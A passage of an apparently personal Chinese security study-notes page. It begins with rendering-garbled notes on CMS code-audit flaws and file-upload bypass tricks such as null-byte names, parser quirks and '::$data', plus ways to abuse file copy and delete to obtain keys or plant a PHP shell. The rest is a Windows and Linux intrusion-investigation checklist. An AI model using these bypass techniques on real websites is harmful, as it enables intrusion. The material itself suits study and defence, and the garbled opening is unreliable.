vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">替</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">它</span><span class="mord">‘</span></span></span></span>encrpststring=md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">this-&gt;time.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord">.</span></span></span></span>verification.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>u</mi><mi>t</mi><mi>h</mi><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">‘</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">auth);`：
`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">‘</span><span class="mord cjk_fallback">：</span><span class="mord">‘</span></span></span></span>timetemp=date(&quot;Y-m-d:i:s&quot;,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo>)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">this-&gt;time);</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span>auth=util::strcode($timetemp,'ENCODE');`<br>
算法的key并没有初始化，如果知道了这个时间，就可以生成加密的字符串</p>
<p><strong>上传</strong><br>
未验证后缀<br>
验证上传后缀被bypass<br>
上传的文件验证了上传后缀但是文件名不重名：阶段yu.php%00.jpg<br>
上传路径可控<br>
解析漏洞：Nginx-yu.jpg/1.php<br>
Apache-yu.php.xxx<br>
验证方法：mime，客户端的js验证，白名单，黑名单<br>
绕过：大小写，文件名没trim在文件名后面加空格：windows下的x.php%81-%99 decode后仍为x.php，Windows下的特性.php::$data</p>
<p><strong>文件操作</strong><br>
任意文件删除 任意文件复制 任意文件重名 任意文件移动 任意文件下载<br>
首先拿到配置文件中的数据库的连接账号和密码-外联<br>
拿到配置文件，拿到加密解密函数的key0生成加密字符串-结合具体的代码利用<br>
文件删除：由于全局的过滤而不能注入时，可以用任意文件删除删掉这个文件，删除安装文件生成的lock文件，重装<br>
文件复制：要复制的文件要复制到的路径-两个都完全可控时直接把自己的图片复制成一个.php马儿，复制的文件可控，而要复制的路径不可控：copy(ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>(</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>)</mo><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">webdb(updir)/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord">/</span></span></span></span>value&quot;.ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>[</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>]</mo><mi mathvariant="normal">/</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">webdb[updir]/(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">[</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">]</span><span class="mord">/</span><span class="mopen">(</span></span></span></span>value).jpg&quot;);,可以把$value控制为保存了qibocms的加密函数的配置文件，复制后成一个.jpg直接打开可以看到ikey<br>
文件下载：下载配置，nadaokey<br>
文件写入<br>
文件包含</p>
<p><strong>加密函数</strong><br>
拿到加密函数的key-加密一些特殊字符然后拿到加密的字符串<br>
加密可逆：若算法导致了知道明文密文，可逆-拿到加密函数的key从而自己生成一个想要的加密字符串<br>
加密可控：要加密的内容是可控的，密文会输出，这个可控的点能引入特殊字符，那么把一些特殊字符代入到这里面，拿到密文再找到一处decode后会进行特殊操作的点进行各种操作<br>
key泄露</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626750266357.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626772693493.png" alt="" loading="lazy"></p>
<p><strong>powershell简单语法</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626774695884.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626774700742.png" alt="" loading="lazy"></p>
<p><strong>PYTHON系统审计</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626776027040.png" alt="" loading="lazy"></p>
<p>** 网络入侵模式图**<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626776731511.png" alt="" loading="lazy"></p>
<p>** 渗透流程**<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626789659521.jpg" alt="" loading="lazy"></p>
<h1 id="2021-07-21">2021-07-21</h1>
<p><strong>xss platform</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626831897017.png" alt="" loading="lazy"></p>
<p><strong>社会工程学</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832591997.jpg" alt="" loading="lazy"></p>
<p><strong>渗透测试流程</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832577202.png" alt="" loading="lazy"></p>
<p><strong>系统端口审计</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832620633.jpg" alt="" loading="lazy"></p>
<p><strong>web服务器入侵防御</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626833337127.jpg" alt="" loading="lazy"></p>
<p><strong>web渗透</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838100969.jpg" alt="" loading="lazy"></p>
<p><strong>web攻击以及防御技术</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838074639.png" alt="" loading="lazy"></p>
<p><strong>XSS汇总</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626838113601.png" alt="" loading="lazy"></p>
<p><strong>web安全</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626877496949.png" alt="" loading="lazy"></p>
<p>#2021-07-23<br>
#入侵排查篇</p>
<p><strong>windows入侵排查</strong></p>
<h3 id="0x00-前言">0x00 前言</h3>
<p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<p>常见的应急响应事件分类：</p>
<p>Web 入侵：网页挂马、主页篡改、Webshell</p>
<p>系统入侵：病毒木马、勒索软件、远控后门</p>
<p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p>
<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p>
<h3 id="0x01-入侵排查思路">0x01 入侵排查思路</h3>
<h4 id="11-检查系统账号安全">1.1 检查系统账号安全</h4>
<p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p>
<ul>
<li>检查方法：据实际情况咨询相关服务器管理员。</li>
</ul>
<p>2、查看服务器是否存在可疑账号、新增账号。</p>
<ul>
<li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</li>
</ul>
<p>3、查看服务器是否存在隐藏账号、克隆账号。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、打开注册表 ，查看管理员对应键值。</p>
<p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001844433.png" alt="" loading="lazy"></p>
<p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p>
</li>
<li>
<p>检查方法：</p>
<p>a、Win+R 打开运行，输入&quot;eventvwr.msc&quot;，回车运行，打开“事件查看器”。</p>
<p>b、导出 Windows 日志 -- 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001885437.png" alt="" loading="lazy"></p>
<h4 id="12-检查异常端口-进程">1.2 检查异常端口、进程</h4>
</li>
</ul>
<p>1、检查端口连接情况，是否有远程连接、可疑连接。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED</p>
<p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 `tasklist  | findstr &quot;PID&quot;<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001907736.png" alt="" loading="lazy"></p>
<p>2、进程</p>
</li>
<li>
<p>检查方法：</p>
<p>a、开始 -- 运行 -- 输入 <code>msinfo32</code> 命令，依次点击 &quot;软件环境 -- 正在运行任务&quot; 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p>
<p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p>
<p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p>
<p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p>
<p>没有签名验证信息的进程<br>
没有描述信息的进程<br>
进程的属主<br>
进程的路径是否合法<br>
CPU 或内存资源占用长时间过高的进程</p>
</li>
</ul>
<p>3、小技巧：</p>
<p>​	a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p>
<p>​	b、查看进程对应的 PID：任务管理器 -- 查看 -- 选择列 -- PID 或者 <code>tasklist | findstr &quot;PID&quot;</code></p>
<p>​	c、查看进程对应的程序位置：</p>
<p>​		任务管理器 -- 选择对应进程 -- 右键打开文件位置</p>
<p>​		运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p>
<p>​	d、<code>tasklist /svc</code>   进程 -- PID -- 服务</p>
<p>​	e、查看Windows服务所对应的端口：</p>
<p>​		%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p>
<h4 id="13-检查启动项-计划任务-服务">1.3 检查启动项、计划任务、服务</h4>
<p>1、检查服务器是否有异常的启动项。</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>
b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>
c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p>
<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p>
<p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p>
<p>d、利用安全软件查看启动项、开机时间管理等。</p>
<p>e、组策略，运行 <code>gpedit.msc</code><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627001934536.png" alt="" loading="lazy"><br>
2、检查计划任务</p>
</li>
<li>
<p>检查方法：</p>
<p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p>
<p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p>
</li>
</ul>
<p>3、服务自启动</p>
<ul>
<li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li>
</ul>
<h4 id="14-检查系统相关信息">1.4 检查系统相关信息</h4>
<p>1、查看系统版本以及补丁信息</p>
<ul>
<li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li>
</ul>
<p>2、查找可疑目录及文件</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p>
<pre><code>Window 2003版本 C:\Documents and Settings
Window 2008R2及以后版本 C:\Users\
</code></pre>
<p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p>
<p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p>
<p>d、回收站、浏览器下载目录、浏览器历史记录</p>
<p>e、修改时间在创建时间之前的为可疑文件</p>
</li>
</ul>
<p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>
b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
<h4 id="15-自动化查杀">1.5 自动化查杀</h4>
<ul>
<li>
<p>病毒查杀</p>
<ul>
<li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li>
</ul>
</li>
<li>
<p>webshell查杀</p>
<ul>
<li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li>
</ul>
</li>
</ul>
<h4 id="16-日志分析">1.6 日志分析</h4>
<p>系统日志</p>
<ul>
<li>
<p>分析方法：</p>
<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>b、Win+R 打开运行，输入 &quot;eventvwr.msc&quot;，回车运行，打开&quot;事件查看器&quot;。</p>
<p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p>
</li>
</ul>
<p>Web 访问日志</p>
<ul>
<li>
<p>分析方法：</p>
<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
<p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p>
</li>
</ul>
<h3 id="0x02-工具篇">0x02 工具篇</h3>
<h4 id="21-病毒分析">2.1 病毒分析</h4>
<p>PCHunter：http://www.xuetr.com</p>
<p>火绒剑：https://www.huorong.cn</p>
<p>Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</p>
<p>processhacker：https://processhacker.sourceforge.io/downloads.php</p>
<p>autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</p>
<p>OTL：https://www.bleepingcomputer.com/download/otl/</p>
<p>SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector</p>
<h4 id="22-病毒查杀">2.2 病毒查杀</h4>
<p>卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe   （推荐理由：绿色版、最新病毒库）</p>
<p>大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</p>
<p>火绒安全软件：https://www.huorong.cn</p>
<p>360杀毒：http://sd.360.cn/download_center.html</p>
<h4 id="23-病毒动态">2.3 病毒动态</h4>
<p>CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn</p>
<p>微步在线威胁情报社区：https://x.threatbook.cn</p>
<p>火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html</p>
<p>爱毒霸社区：http://bbs.duba.net</p>
<p>腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html</p>
<h4 id="24-在线病毒扫描网站">2.4 在线病毒扫描网站</h4>
<p>Virustotal：https://www.virustotal.com</p>
<p>Virscan：http://www.virscan.org</p>
<p>腾讯哈勃分析系统：https://habo.qq.com</p>
<p>Jotti 恶意软件扫描系统：https://virusscan.jotti.org</p>
<h4 id="25-webshell查杀">2.5 webshell查杀</h4>
<p>D盾_Web查杀：http://www.d99net.net/index.asp</p>
<p>河马 WebShell 查杀：http://www.shellpub.com</p>
<p>#Linux 入侵排查<br>
当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p>
<h3 id="0x01-入侵排查思路-2">0x01 入侵排查思路</h3>
<h4 id="11-账号安全">1.1 账号安全</h4>
<p><strong>基本使用：</strong></p>
<pre><code>1、用户信息文件 /etc/passwd
root:x:0:0:root:/root:/bin/bash
account:password:UID:GID:GECOS:directory:shell
用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell
注意：无密码只允许本机登陆，远程不允许登陆

2、影子文件 /etc/shadow
root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::
用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留
</code></pre>
<pre><code>who     查看当前登录用户（tty 本地登陆  pts 远程登录）
w       查看系统信息，想知道某一时刻用户的行为
uptime  查看登陆多久、多少用户，负载状态
</code></pre>
<p><strong>入侵排查：</strong></p>
<pre><code>1、查询特权用户特权用户(uid 为0)
[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd
2、查询可以远程登录的帐号信息
[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow
3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
4、禁用或删除多余及可疑的帐号
    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头
	userdel user       删除 user 用户
	userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除
</code></pre>
<h4 id="12-历史命令">1.2 历史命令</h4>
<p><strong>基本使用：</strong></p>
<p>通过 .bash_history 文件查看帐号执行过的系统命令</p>
<pre><code>1、root 用户的历史命令
histroy
2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。
为历史的命令增加登录的 IP 地址、执行命令时间等信息：
1）保存1万条命令
sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile
2）在/etc/profile的文件尾部添加如下行数配置信息：
######jiagu history xianshi#########
USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`
if [ &quot;$USER_IP&quot; = &quot;&quot; ]
then
USER_IP=`hostname`
fi
export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
shopt -s histappend
export PROMPT_COMMAND=&quot;history -a&quot;
######### jiagu history xianshi ##########
3）source /etc/profile 让配置生效
生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile
3、历史操作命令的清除：history -c
但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。
</code></pre>
<p><strong>入侵排查：</strong></p>
<pre><code>进入用户目录下，导出历史命令。
cat .bash_history &gt;&gt; history.txt
</code></pre>
<h4 id="13-检查异常端口">1.3 检查异常端口</h4>
<p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p>
<pre><code>netstat -antlp | more

查看下 pid 所对应的进程文件路径，
运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）
</code></pre>
<h4 id="14-检查异常进程">1.4 检查异常进程</h4>
<p>使用 ps 命令，分析进程</p>
<pre><code>ps aux | grep pid 
</code></pre>
<h4 id="15-检查开机启动项">1.5 检查开机启动项</h4>
<p><strong>基本使用：</strong></p>
<p>系统运行级别示意图：</p>
<table>
<thead>
<tr>
<th style="text-align:center">运行级别</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">关机</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">不完全的命令行模式，不含NFS服务</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">完全的命令行模式，就是标准字符界面</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">系统保留</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">图形模式</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">重启动</td>
</tr>
</tbody>
</table>
<p>查看运行级别命令 <code>runlevel</code></p>
<p>系统默认允许级别</p>
<pre><code>vi  /etc/inittab
id=3：initdefault  #系统开机后直接进入哪个运行级别
</code></pre>
<p>开机启动配置文件</p>
<pre><code>/etc/rc.local
/etc/rc.d/rc[0~6].d
</code></pre>
<p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p>
<p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p>
<pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
</code></pre>
<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p>
<p><strong>入侵排查：</strong></p>
<p>启动项文件：</p>
<pre><code>more /etc/rc.local
/etc/rc.d/rc[0~6].d
ls -l /etc/rc.d/rc3.d/
</code></pre>
<h4 id="16-检查定时任务">1.6 检查定时任务</h4>
<p><strong>基本使用</strong></p>
<p>1、利用 crontab 创建计划任务</p>
<ul>
<li>
<p>基本命令</p>
<pre><code>crontab -l   列出某个用户cron服务的详细内容

Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root

crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)

crontab -e   使用编辑器编辑当前的crontab文件 

如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件
</code></pre>
</li>
</ul>
<p>2、利用 anacron 命令实现异步定时任务调度</p>
<ul>
<li>
<p>使用案例</p>
<pre><code>每天运行 /home/backup.sh 脚本：
vi /etc/anacrontab 
@daily    10    example.daily   /bin/bash /home/backup.sh
当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。
</code></pre>
</li>
</ul>
<p><strong>入侵排查</strong></p>
<p>重点关注以下目录中是否存在恶意脚本</p>
<pre><code>/var/spool/cron/* 
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/* 
/etc/cron.hourly/* 
/etc/cron.monthly/*
/etc/cron.weekly/
/etc/anacrontab
/var/spool/anacron/*
</code></pre>
<p>小技巧：</p>
<pre><code>more /etc/cron.daily/*  查看目录下所有文件
</code></pre>
<h4 id="17-检查服务">1.7 检查服务</h4>
<p><strong>服务自启动</strong></p>
<p>第一种修改方法：</p>
<pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]
chkconfig –level  2345 httpd on  开启自启动
chkconfig httpd on （默认level是2345）
</code></pre>
<p>第二种修改方法：</p>
<pre><code>修改 /etc/re.d/rc.local 文件  
加入 /etc/init.d/httpd start
</code></pre>
<p>第三种修改方法：</p>
<p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p>
<p><strong>入侵排查</strong></p>
<p>1、查询已安装的服务：</p>
<p>RPM 包安装的服务</p>
<pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务
ps aux | grep crond 查看当前服务

系统在3与5级别下的启动项 
中文环境
chkconfig --list | grep &quot;3:启用\|5:启用&quot;
英文环境
chkconfig --list | grep &quot;3:on\|5:on&quot;
</code></pre>
<p>源码包安装的服务</p>
<pre><code>查看服务安装位置 ，一般是在/user/local/
service httpd start
搜索/etc/rc.d/init.d/  查看是否存在
</code></pre>
<h4 id="18-检查异常文件">1.8 检查异常文件</h4>
<p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p>
<p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>​	可以使用find命令来查找，如  find /opt -iname &quot;*&quot; -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
<p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p>
<h4 id="19-检查系统日志">1.9 检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/cups</td>
<td style="text-align:center">记录打印信息的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/dmesg</td>
<td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/mailog</td>
<td style="text-align:center">记录邮件信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/lastlog</td>
<td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/wtmp</td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/utmp</td>
<td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
